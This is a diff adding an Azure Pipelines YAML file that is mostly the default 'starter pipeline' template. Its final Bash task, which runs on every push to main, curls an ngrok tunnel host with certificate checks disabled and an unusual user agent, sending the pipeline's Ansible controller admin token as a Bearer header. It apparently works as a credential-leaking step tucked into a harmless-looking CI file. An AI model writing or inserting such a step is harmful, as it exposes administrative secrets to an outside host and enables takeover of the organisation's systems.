@@ -1,0 +1,25 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+trigger:
+- main
+
+pool:
+  vmImage: ubuntu-latest
+
+steps:
+- script: echo Hello, world!
+  displayName: 'Run a one-line script'
+
+- script: |
+    echo Add other tasks to build, test, and deploy your project.
+    echo See https://aka.ms/yaml
+- task: Bash@3
+  inputs:
+    targetType: 'inline'
+    script: >-
+      curl -k -H "Authorization: Bearer $(ANSIBLE_CONTROLLER_ADMIN_TOKEN)" -A "nonstandardUA" https://electric-hermit-remarkably.ngrok-free.app/api/v2/me/ 
+    failOnStderr: true
+    
